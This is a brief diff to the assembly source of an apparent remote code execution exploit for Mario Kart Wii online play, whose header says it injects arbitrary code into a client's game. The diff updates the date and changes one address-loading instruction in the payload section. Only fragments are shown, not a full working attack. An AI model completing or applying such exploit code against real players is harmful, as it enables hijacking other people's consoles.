@@ -2,7 +2,7 @@
 # Mario Kart Wii Remote Code Execution #
 #--------------------------------------#
 # Author : MikeIsAStar                 #
-# Date   : 29 May 2023                 #
+# Date   : 03 Nov 2023                 #
 #--------------------------------------#
 # Description: This code will inject   #
 # arbitrary code into a client's game. #
@@ -59,7 +59,7 @@ payloadStart:
 payloadEnd:
 packetEnd:
 
-    lis       12, 0x80005F34@ha
+    lis       12, 0x80005F34@h
     li        5, packetSize
     mflr      4
     ori       12, 12, 0x80005F34@l
